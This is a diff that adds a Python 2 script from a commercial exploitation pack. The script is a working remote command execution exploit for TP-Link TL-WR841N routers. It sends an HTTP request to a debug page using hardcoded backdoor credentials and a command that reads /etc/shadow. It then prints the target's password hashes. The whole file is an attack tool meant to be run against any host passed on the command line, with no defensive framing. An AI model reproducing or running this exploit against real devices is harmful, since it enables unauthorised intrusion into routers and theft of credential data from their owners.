@@ -1,0 +1,49 @@
+#! /usr/bin/env python2
+
+#
+# Proprietary D2 Exploitation Pack source code - use only under the license
+# agreement specified in LICENSE.txt in your D2 Exploitation Pack
+#
+# Copyright DSquare Security, LLC, 2007-2013
+#
+
+###
+# STD modules
+###
+import os, sys, re
+import cStringIO
+try:
+  import pycurl
+except:
+  print 'No module pycurl'
+
+_name_   = 'd2sec_tplink_2'
+_vendor_ = 'tp-link'
+_model_  = ['TL-WR841N']
+_vuln_   = 'Remote Command Execution'
+_cve_    = ''
+_ref_    = ''
+_port_   = 80
+
+def pwnrouter(host):
+  try:
+    nfo = cStringIO.StringIO()
+    c = pycurl.Curl()
+    c.setopt(pycurl.URL, 'http://%s/userRpm/DebugResultRpm.htm?cmd=cat%%20/etc/shadow&&usr=osteam&passwd=5up' % host)
+    c.setopt(pycurl.USERAGENT, 'Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.0.1)')
+    c.setopt(pycurl.WRITEFUNCTION, nfo.write)
+    c.perform()
+  except Exception, e:
+    print '[-] error : %s' % e
+    return
+  data = nfo.getvalue()
+  if 'Login Incorrect' in data:
+    print '[+] %s not vulnerable' % host
+    sys.exit(0)
+  print '[+] %s vulnerable\n\n' % host
+  print data
+  c.close()
+
+if __name__ == "__main__":
+  pwnrouter(sys.argv[1])
+
